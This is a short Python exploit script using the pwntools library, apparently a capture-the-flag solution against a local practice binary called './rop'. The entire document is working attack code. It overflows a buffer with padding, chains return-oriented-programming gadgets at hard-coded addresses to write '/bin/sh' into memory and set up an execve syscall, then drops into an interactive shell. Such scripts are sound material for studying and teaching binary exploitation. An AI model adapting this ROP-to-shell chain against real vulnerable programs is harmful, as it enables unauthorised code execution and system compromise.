from pwn import *

p = process('./rop')

mov_rdi_rdx = 0x0000000000400aba
pop_rsi = 0x00000000004017a7
pop_rdi = 0x0000000000401693
pop_rdx = 0x00000000004371d5
pop_rax = 0x000000000046b408
syscall = 0x0000000000400488
bss = 0x006c2000 - 0x100

payload = b'a'*40
payload += p64(pop_rdi) + p64(bss)
payload += p64(pop_rdx) + b'/bin/sh\x00'
payload += p64(mov_rdi_rdx)
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rdx) + p64(0)
payload += p64(pop_rax) + p64(59)
payload += p64(syscall)

p.sendafter('skill.', payload)

p.interactive()